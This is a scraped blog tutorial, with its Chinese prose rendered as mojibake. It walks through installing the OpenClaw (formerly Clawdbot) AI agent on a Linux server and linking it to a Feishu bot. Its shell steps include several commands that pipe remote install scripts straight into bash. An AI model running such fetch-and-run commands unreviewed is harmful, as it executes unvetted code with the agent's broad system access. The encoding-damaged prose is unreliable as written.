<meta itemprop="datePublished" content="2026-01-31T00:25:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¿å§†çº§ OpenClaw ï¼ˆåŸ Clawdbotï¼‰é£ä¹¦å¯¹æ¥æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ•™ä½ æ­å»º AI åŠ©æ‰‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T00:25:53.000Z" title="Sat Jan 31 2026 00:25:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¿å§†çº§ OpenClaw ï¼ˆåŸ Clawdbotï¼‰é£ä¹¦å¯¹æ¥æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ•™ä½ æ­å»º AI åŠ©æ‰‹</h2>
<p>OpenClaw æ˜¯ä¸€æ¬¾å¼€æºçš„æœ¬åœ° AI åŠ©æ‰‹,æ”¯æŒåœ¨ä½ è‡ªå·±çš„æœåŠ¡å™¨ä¸Šéƒ¨ç½²,é€šè¿‡é£ä¹¦ã€WhatsAppã€Telegram ç­‰èŠå¤©å·¥å…·äº¤äº’ã€‚ä¸äº‘ç«¯ SaaS æœåŠ¡ä¸åŒ,OpenClaw è®©ä½ å®Œå…¨æŒæ§æ•°æ®éšç§,å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æµè§ˆç½‘é¡µã€ç®¡ç†æ–‡ä»¶,ç”šè‡³ç¼–å†™ä»£ç ã€‚æœ¬æ•™ç¨‹å°†æ‰‹æŠŠæ‰‹æ•™ä½ åœ¨ Linux ç³»ç»Ÿä¸‹å®‰è£… OpenClaw å¹¶å¯¹æ¥é£ä¹¦æœºå™¨äºº,æ‰“é€ ä¸“å±çš„æ™ºèƒ½åŠ©ç†ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼šæœ¬æ•™ç¨‹åœ¨ Linux ç³»ç»Ÿä¸‹è¿›è¡Œ</p>
</blockquote>
<h3 data-id="heading-1">OpenClaw æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>OpenClaw(åŸå Clawdbot,åæ›´åä¸º Moltbot,ç°æ­£å¼å‘½åä¸º OpenClaw)æ˜¯ä¸€ä¸ªè¿è¡Œåœ¨ä½ æœ¬åœ°ç¯å¢ƒçš„é«˜æƒé™ AI æ™ºèƒ½ä½“ã€‚å®ƒçš„æ ¸å¿ƒç‰¹æ€§åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>æœ¬åœ°éƒ¨ç½²</strong>ï¼šè¿è¡Œåœ¨ä½ çš„æœåŠ¡å™¨æˆ–ç”µè„‘ä¸Š,æ•°æ®å®Œå…¨è‡ªä¸»å¯æ§</li>
<li><strong>å¤šå¹³å°æ”¯æŒ</strong>ï¼šæ”¯æŒé£ä¹¦ã€WhatsAppã€Telegramã€Discordã€Slack ç­‰ä¸»æµèŠå¤©å·¥å…·</li>
<li><strong>æµè§ˆå™¨æ§åˆ¶</strong>ï¼šå¯ä»¥æµè§ˆç½‘é¡µã€å¡«å†™è¡¨å•ã€æå–æ•°æ®</li>
<li><strong>ç³»ç»Ÿè®¿é—®</strong>ï¼šè¯»å†™æ–‡ä»¶ã€æ‰§è¡Œ Shell å‘½ä»¤ã€è¿è¡Œè„šæœ¬</li>
<li><strong>æŒä¹…åŒ–è®°å¿†</strong>ï¼šè®°ä½ä½ çš„åå¥½å’Œä¸Šä¸‹æ–‡,æˆä¸ºçœŸæ­£å±äºä½ çš„ AI</li>
<li><strong>æ’ä»¶æ‰©å±•</strong>ï¼šæ”¯æŒç¤¾åŒºæŠ€èƒ½æ’ä»¶,ç”šè‡³å¯ä»¥è‡ªå·±ç¼–å†™æ’ä»¶</li>
</ul>
<p>æ— è®ºæ˜¯é‚®ä»¶ç®¡ç†ã€æ—¥ç¨‹å®‰æ’ã€æ•°æ®æŸ¥è¯¢è¿˜æ˜¯ä»£ç ç¼–å†™,OpenClaw éƒ½èƒ½æˆä¸ºä½ çš„å¾—åŠ›åŠ©æ‰‹ã€‚</p>
<h3 data-id="heading-2">å‡†å¤‡å·¥ä½œ</h3>
<p>é¦–å…ˆå‡†å¤‡ä¸€å°é—²ç½®çš„äº‘æœåŠ¡å™¨æˆ– VPSï¼ˆæ¨èä½¿ç”¨é¦™æ¸¯æˆ–æµ·å¤–èŠ‚ç‚¹ï¼‰ã€‚ç”±äº OpenClaw è¿è¡Œæ—¶æƒé™è¾ƒå¤§ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œä¸å»ºè®®åœ¨æœ¬åœ°æˆ–å·¥ä½œæœºä¸Šå®‰è£…ï¼Œæ¨èåœ¨ä¸€å°ç‹¬ç«‹çš„ç©ºæœåŠ¡å™¨ä¸Šéƒ¨ç½²ã€‚å‡†å¤‡å®Œæˆåï¼Œç™»å½•åˆ°æœåŠ¡å™¨ã€‚</p>
<h3 data-id="heading-3">å®‰è£…</h3>
<blockquote>
<p>å¦‚æœä½ ä¸æƒ³å®‰è£…ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨é˜¿é‡Œäº‘çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Factivity%2Fecs%2Fclawdbot%3FuserCode%3Doq2t54oi" target="_blank" title="https://www.aliyun.com/activity/ecs/clawdbot?userCode=oq2t54oi" ref="nofollow noopener noreferrer">Openclaw ä¸€é”®éƒ¨ç½² (åŸ Clawdbot)</a>ï¼Œéƒ¨ç½²ä¹‹åå¯ä»¥ç›´æ¥è·³åˆ°<a href="#%E5%AF%B9%E6%8E%A5%E9%A3%9E%E4%B9%A6" title="#%E5%AF%B9%E6%8E%A5%E9%A3%9E%E4%B9%A6">å¯¹æ¥é£ä¹¦</a>ã€‚</p>
</blockquote>
<p>ç¬¬ä¸€æ­¥å®‰è£… Git</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å®‰è£… Git</span>
sudo apt update
sudo apt install git -y
</code></pre>
<p>ç¬¬äºŒæ­¥å®‰è£… Node.js</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å®‰è£… NVM</span>
<span class="hljs-meta prompt_"># </span><span class="bash">å›½å†…ä½¿ç”¨ gitee çš„é•œåƒæº</span>
curl -o- https://gitee.com/RubyMetric/nvm-cn/raw/main/install.sh | bash
<span class="hljs-meta prompt_">
# </span><span class="bash">å›½å¤–ä½¿ç”¨</span>
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash
<span class="hljs-meta prompt_">
# </span><span class="bash">é‡æ–°åŠ è½½ç¯å¢ƒå˜é‡</span>
source ~/.bashrc
<span class="hljs-meta prompt_">
# </span><span class="bash">å®‰è£… Node.js 22</span>
nvm install 22
<span class="hljs-meta prompt_">
# </span><span class="bash">æŸ¥çœ‹ nodejs ç‰ˆæœ¬</span>
node -v # è¾“å‡º v22 å³å¯ï¼Œç‰ˆæœ¬åªè¦ 22 å°±è¡Œ
</code></pre>
<h3 data-id="heading-4">å®‰è£… Openclaw</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">ä½¿ç”¨å®˜æ–¹è„šæœ¬å®‰è£…</span>
curl -fsSL https://openclaw.bot/install.sh | bash
</code></pre>
<blockquote>
<p>æœåŠ¡å™¨åœ¨å›½å†…ï¼Œå¦‚æœå®‰è£…å¤±è´¥çš„è¯ï¼Œå¯èƒ½éœ€è¦è§£å†³ç½‘ç»œé—®é¢˜</p>
</blockquote>
<p>å…¶ä»–å¹³å°å®‰è£…æ–¹å¼è¯·å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openclaw.bot%2Finstall%2Finstaller" target="_blank" title="https://docs.openclaw.bot/install/installer" ref="nofollow noopener noreferrer">Openclaw å®‰è£…æ–‡æ¡£ (åŸ Clawdbot)</a></p>
<p>ä½ ä¼šçœ‹åˆ°å¦‚ä¸‹å›¾è¾“å‡º
<img src="https://image.catchadmin.com/202601310803318.png" alt="Openclaw (åŸ Clawdbot) å®‰è£…è¿‡ç¨‹ - AI åŠ©æ‰‹éƒ¨ç½²åˆå§‹åŒ–" loading="lazy"/>
å¦‚æœé¦–æ¬¡å®‰è£…ï¼Œæ—¶é—´ä¼šå¾ˆé•¿ï¼Œéœ€è¦è€å¿ƒç­‰å¾…ã€‚
å¦‚æœæœ€åè¾“å‡ºå¦‚ä¸‹å†…å®¹ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">â†’ npm install failed; cleaning up and retrying...
</code></pre>
<p>æ–°çš„è„šæœ¬æœåŠ¡å™¨å†…å­˜è¦æ±‚å˜é«˜äº†ï¼Œæ®æˆ‘ä½¿ç”¨ä¸‹æ¥ 2G å†…å­˜ï¼Œè‚¯å®šä¼š OOMï¼Œå¦‚æœå‡ºé”™çš„è¯ï¼Œå»ºè®®ä½¿ç”¨ <code>swap</code> æŠŠç¡¬ç›˜ç©ºé—´å½“ä½œäº¤äº’å†…å­˜ä½¿ç”¨ã€‚</p>
<p>æˆåŠŸä¹‹åä¼šè¾“å‡ºå¦‚ä¸‹å›¾ç‰‡
<img src="https://image.catchadmin.com/202601310805358.png" alt="Openclaw (åŸ Clawdbot) å®‰è£…æˆåŠŸ - AI æœºå™¨äººé…ç½®å‘å¯¼" loading="lazy"/>
ç¬¬ä¸€ä¸ªé€‰é¡¹é€‰æ‹© <code>yes</code>, å°±æ˜¯è¯¢é—®ä½ æ˜¯å¦çŸ¥é“é£é™©çš„ã€‚
ç¬¬äºŒæ­¥é€‰æ‹© <code>QuickStart</code>
<img src="https://image.catchadmin.com/202601281351166.png" alt="Openclaw (åŸ Clawdbot) QuickStart å¿«é€Ÿå¼€å§‹é€‰é¡¹" loading="lazy"/>
ç¬¬ä¸‰æ­¥é€‰æ‹©æ¨¡å‹æœåŠ¡å•†ï¼Œè¿™é‡Œé€‰æ‹© <code>Qwen</code>ï¼Œå…è´¹é¢åº¦å……è¶³ï¼Œé€‚åˆå…¥é—¨ä½¿ç”¨
<img src="https://image.catchadmin.com/202601281352080.png" alt="Openclaw (åŸ Clawdbot) é€‰æ‹© AI æ¨¡å‹æœåŠ¡å•† Qwen åƒé—®" loading="lazy"/>
é€‰æ‹©åƒé—®æ¨¡å‹åï¼Œä¼šæä¾›ä¸€ä¸ªé“¾æ¥ï¼Œå¤åˆ¶å¹¶åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281355542.png" alt="Openclaw (åŸ Clawdbot) åƒé—®æ¨¡å‹æˆæƒé“¾æ¥" loading="lazy"/>
æ‰“å¼€æµè§ˆå™¨åï¼Œä¼šçœ‹åˆ°å¦‚ä¸‹ç•Œé¢ã€‚ç”±äºæˆ‘å·²ç™»å½•è¿‡ï¼Œæ‰€ä»¥æ˜¾ç¤ºè´¦æˆ·ä¿¡æ¯ï¼›å¦‚æœå°šæœªç™»å½•ï¼ŒæŒ‰ç…§æç¤ºå®Œæˆç™»å½•å³å¯ã€‚
<img src="https://image.catchadmin.com/202601281356909.png" alt="Openclaw (åŸ Clawdbot) åƒé—® AI è´¦æˆ·ç™»å½•é¡µé¢" loading="lazy"/>
ç™»å½•å®Œæˆåï¼Œä¼šå‡ºç°ä»¥ä¸‹é€‰é¡¹ï¼Œæç¤ºé€‰æ‹©å¯¹åº”çš„åƒé—®æ¨¡å‹ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281358170.png" alt="Openclaw (åŸ Clawdbot) é€‰æ‹©åƒé—® AI æ¨¡å‹ç‰ˆæœ¬" loading="lazy"/></p>
<p>é€‰æ‹©é»˜è®¤æ¨¡å‹å³å¯ã€‚æ¥ä¸‹æ¥ä¼šæç¤ºé€‰æ‹© channelï¼Œè¿™é‡Œå…ˆè·³è¿‡ï¼Œåç»­å†æ·»åŠ </p>
<p><img src="https://image.catchadmin.com/202601281359123.png" alt="Openclaw (åŸ Clawdbot) channel æ¸ é“é…ç½®é€‰é¡¹" loading="lazy"/>
ç»§ç»­ä¸‹é¢é€‰æ‹© skillsï¼Œä¹Ÿæ˜¯é€‰æ‹© <code>No</code>ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281359786.png" alt="Openclaw (åŸ Clawdbot) skills æŠ€èƒ½é…ç½®é€‰é¡¹" loading="lazy"/>
ç»§ç»­ä¸‹é¢é€‰æ‹© hooksï¼Œä¹Ÿæ˜¯ä½¿ç”¨<code>ç©ºæ ¼</code>é€‰æ‹© <code>No</code>ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281400483.png" alt="Openclaw (åŸ Clawdbot) hooks é…ç½®é€‰é¡¹" loading="lazy"/>
ç„¶åç­‰å¾…å®‰è£…å®Œæˆï¼Œæœ€åä¼šå‡ºç°ä»¥ä¸‹é€‰é¡¹ï¼Œè¿™é‡Œé€‰æ‹© <code>TUI</code>
<img src="https://image.catchadmin.com/202601281403169.png" alt="Openclaw (åŸ Clawdbot) é€‰æ‹© TUI ç»ˆç«¯ç•Œé¢" loading="lazy"/>
å¦‚æœçœ‹åˆ° TUI èŠå¤©ç•Œé¢ï¼Œè¯´æ˜å®‰è£…æˆåŠŸï¼Œå¯ä»¥å°è¯•è¾“å…¥ <code>Hello</code> è¿›è¡Œæµ‹è¯•ã€‚
<img src="https://image.catchadmin.com/202601281404354.png" alt="Openclaw (åŸ Clawdbot) TUI èŠå¤©ç•Œé¢ - AI åŠ©æ‰‹å¯¹è¯æµ‹è¯•" loading="lazy"/>
ç„¶åç›´æ¥ä½¿ç”¨ <code>ctrl+c</code> å…ˆå…³é—­ï¼Œåé¢æˆ‘ä»¬å†æ¥è®¾ç½®</p>
<h4 data-id="heading-5">æŸ¥çœ‹æœåŠ¡</h4>
<p>å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æŸ¥çœ‹</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot status
</code></pre>
<p>ä¼šçœ‹åˆ°å¦‚ä¸‹å›¾çš„ç»“æœå°±è¯´æ˜æœåŠ¡å¯åŠ¨äº†
<img src="https://image.catchadmin.com/202601281449942.png" alt="Openclaw (åŸ Clawdbot) æœåŠ¡çŠ¶æ€æ£€æŸ¥ - AI åŠ©æ‰‹è¿è¡Œä¸­" loading="lazy"/></p>
<h4 data-id="heading-6">è®¿é—® Web UI é¢æ¿</h4>
<p>å¦‚ä½•è®¿é—®é¢æ¿ï¼ŸæœåŠ¡ç›‘å¬åœ¨ <code>http://127.0.0.1:18789/</code> ç«¯å£ä¸Šï¼Œæˆ‘ä»¬ç°åœ¨é€šè¿‡ ssh éš§é“æ¥è®¿é—®ï¼Œè¾“å…¥ä¸‹é¢çš„å‘½ä»¤</p>
<pre><code class="hljs language-shell" lang="shell">ssh -N -L 18789:127.0.0.1:18789 ç”¨æˆ·å@æœåŠ¡å™¨IP
<span class="hljs-meta prompt_"># </span><span class="bash">å›è½¦ä¹‹å</span>
ç”¨æˆ·å@æœåŠ¡å™¨IP's password: # è¾“å…¥å¯†ç 
</code></pre>
<p>ç„¶ååœ¨æµè§ˆå™¨æ‰“å¼€ <code>http://127.0.0.1:18789/</code>, ä½ ä¼šçœ‹åˆ° Dashboard äº†ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281509102.png" alt="Openclaw (åŸ Clawdbot) Web UI Dashboard æœªæˆæƒé¡µé¢" loading="lazy"/>
å›¾ä¸­æ˜¾ç¤ºçš„æ˜¯æœªæˆæƒçŠ¶æ€ï¼Œå›åˆ°æœåŠ¡å™¨ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot dashboard
</code></pre>
<p>ä¼šçœ‹åˆ°ä¸‹é¢çš„é¢æ¿æ•°æ®
<img src="https://image.catchadmin.com/202601281530336.png" alt="Openclaw (åŸ Clawdbot) Dashboard URL è·å–å‘½ä»¤" loading="lazy"/>
å¤åˆ¶å¯¹åº”çš„ <code>Dashboard URL</code> åˆ°æµè§ˆå™¨æ‰“å¼€ï¼Œå³å¯æ­£å¸¸æŸ¥çœ‹èŠå¤©è®°å½•ã€‚
<img src="https://image.catchadmin.com/202601281532427.png" alt="Openclaw (åŸ Clawdbot) Web UI ç®¡ç†é¢æ¿ - AI åŠ©æ‰‹èŠå¤©è®°å½•" loading="lazy"/></p>
<p>è‡³æ­¤ Openclaw (åŸ Clawdbot) å·²å®‰è£…å®Œæˆï¼Œå¯ä»¥æ­£å¸¸è®¿é—®äº†ã€‚ç„¶åèŠå¤©æ¡†é‡Œé¢é¦–æ¬¡è¾“å…¥ <code>Hello</code>, <code>Clawdbot</code> ä¼šè¯¢é—®ä½ ä»–åº”è¯¥å«ä»€ä¹ˆï¼Œåº”è¯¥å«ä½ ä»€ä¹ˆã€‚å°±æ˜¯ä½ éœ€è¦ç»™å®ƒè®¾ç½®ä¸ªåå­—ï¼Œè¿˜æœ‰ bot æ”¹å«ä½ ä»€ä¹ˆã€‚ä½ å¯ä»¥åœ¨èŠå¤©æ¡†è¿™ä¹ˆè¾“å…¥</p>
<pre><code class="hljs language-shell" lang="shell">Name: Openclaw

My Name: Boss
</code></pre>
<h3 data-id="heading-7">å¯¹æ¥é£ä¹¦</h3>
<p>é¦–å…ˆå®‰è£…é£ä¹¦æ’ä»¶ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot plugins install @m1heng-clawd/feishu
</code></pre>
<p>ç™»å½•é£ä¹¦å¼€æ”¾å¹³å° <a href="https://link.juejin.cn?target=https%3A%2F%2Fopen.feishu.cn%25EF%25BC%258C%25E7%2582%25B9%25E5%2587%25BB%25E3%2580%258C%25E5%25BC%2580%25E5%258F%2591%25E8%2580%2585%25E5%2590%258E%25E5%258F%25B0" target="_blank" title="https://open.feishu.cn%EF%BC%8C%E7%82%B9%E5%87%BB%E3%80%8C%E5%BC%80%E5%8F%91%E8%80%85%E5%90%8E%E5%8F%B0" ref="nofollow noopener noreferrer">open.feishu.cnï¼Œç‚¹å‡»ã€Œå¼€å‘è€…åå°</a> -&gt; åˆ›å»ºä¼ä¸šè‡ªå»ºåº”ç”¨ã€ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281539117.png" alt="é£ä¹¦å¼€æ”¾å¹³å°åˆ›å»ºä¼ä¸šè‡ªå»ºåº”ç”¨ - Openclaw å¯¹æ¥" loading="lazy"/>
ç„¶åç‚¹å‡»åˆ›å»ºåº”ç”¨ï¼Œå¦‚ä¸‹
<img src="https://image.catchadmin.com/202601281743642.png" alt="é£ä¹¦åˆ›å»ºåº”ç”¨ - Openclaw AI æœºå™¨äºº" loading="lazy"/>
åˆ›å»ºå®Œæˆåï¼Œé¦–å…ˆåˆ°å‡­æ®ç®¡ç†ä¸­è·å– App ID å’Œ App Secretï¼Œæ³¨æ„ä¿å­˜ï¼Œåç»­é…ç½®éœ€è¦ä½¿ç”¨ã€‚
<img src="https://image.catchadmin.com/202601281757469.png" alt="é£ä¹¦ App ID å’Œ App Secret å‡­æ®ç®¡ç†" loading="lazy"/>
ç„¶åæ·»åŠ æœºå™¨äººï¼Œå¦‚ä¸‹æ“ä½œ
<img src="https://image.catchadmin.com/202601281758607.png" alt="é£ä¹¦æ·»åŠ æœºå™¨äººèƒ½åŠ› - Openclaw AI åŠ©æ‰‹" loading="lazy"/>
é¦–å…ˆé…ç½®ä¸ªåå­—
<img src="https://image.catchadmin.com/202601281758721.png" alt="é£ä¹¦æœºå™¨äººåç§°é…ç½® - Openclaw" loading="lazy"/></p>
<p>é£ä¹¦çš„å…¶ä»–é…ç½®å…ˆæš‚åœï¼Œå›åˆ°æœåŠ¡å™¨é…ç½® Openclaw çš„é£ä¹¦å‚æ•°</p>
<h4 data-id="heading-8">æ·»åŠ é£ä¹¦é…ç½®</h4>
<pre><code class="hljs language-shell" lang="shell">clawdbot config set channels.feishu.appId "é£ä¹¦ app id"

clawdbot config set channels.feishu.appSecret "é£ä¹¦ app secret"

clawdbot config set channels.feishu.enabled true
<span class="hljs-meta prompt_">
# </span><span class="bash">æ¨èä½¿ç”¨ websocket</span>
clawdbot config set channels.feishu.connectionMode websocket

clawdbot config set channels.feishu.dmPolicy pairing

clawdbot config set channels.feishu.groupPolicy allowlist

clawdbot config set channels.feishu.requireMention true
</code></pre>
<p>é…ç½®å®Œæˆä¹‹åï¼Œé‡å¯</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot gateway restart
</code></pre>
<p>é‡å¯å®Œæˆåå›åˆ°é£ä¹¦ï¼Œæ‰¾åˆ°ã€Œäº‹ä»¶å’Œå›è°ƒã€ï¼Œé€‰æ‹©é•¿è¿æ¥æ¨¡å¼ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281802128.png" alt="é£ä¹¦äº‹ä»¶å’Œå›è°ƒé…ç½® - Openclaw é•¿è¿æ¥æ¨¡å¼" loading="lazy"/>
å¦‚æœé…ç½®æˆåŠŸï¼Œè¯´æ˜è¿æ¥å·²å»ºç«‹ã€‚ç»§ç»­ä¸‹é¢çš„é…ç½®ï¼Œæ·»åŠ äº‹ä»¶ï¼Œé€‰æ‹©ã€Œæ¥æ”¶æ¶ˆæ¯ã€äº‹ä»¶
<img src="https://image.catchadmin.com/202601281811231.png" alt="é£ä¹¦æ·»åŠ æ¥æ”¶æ¶ˆæ¯äº‹ä»¶ - Openclaw AI åŠ©æ‰‹" loading="lazy"/>
äº‹ä»¶æ·»åŠ å®Œæˆä¹‹åï¼Œè¿˜éœ€è¦å¼€é€šæƒé™ï¼Œæœ‰ä»¥ä¸‹æƒé™å…¨éƒ¨å‹¾é€‰</p>




















<table><thead><tr><th>æƒé™</th><th>Scopeï¼ˆèŒƒå›´ï¼‰</th><th>Descriptionï¼ˆè¯´æ˜ï¼‰</th></tr></thead><tbody><tr><td>contact:user.base:readonly</td><td>ç”¨æˆ·ä¿¡æ¯</td><td>è·å–åŸºç¡€ç”¨æˆ·ä¿¡æ¯</td></tr><tr><td>im:message</td><td>æ¶ˆæ¯ å…¨éƒ¨å‹¾é€‰</td><td>å‘é€å’Œæ¥æ”¶æ¶ˆæ¯</td></tr></tbody></table>
<p>å¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281545906.png" alt="é£ä¹¦æƒé™é…ç½® - Openclaw ç”¨æˆ·ä¿¡æ¯æƒé™" loading="lazy"/></p>
<p><img src="https://image.catchadmin.com/202601281549559.png" alt="é£ä¹¦æ¶ˆæ¯æƒé™é…ç½® - Openclaw AI æœºå™¨äºº" loading="lazy"/></p>
<p>ä»¥ä¸Šæ­¥éª¤å…¨éƒ¨å®Œæˆåï¼Œå³å¯ä¸æœºå™¨äººå¯¹è¯ã€‚ä½†åœ¨æ­¤ä¹‹å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªç‰ˆæœ¬
<img src="https://image.catchadmin.com/202601281814848.png" alt="é£ä¹¦åº”ç”¨ç‰ˆæœ¬å‘å¸ƒ - Openclaw AI åŠ©æ‰‹ä¸Šçº¿" loading="lazy"/></p>
<blockquote>
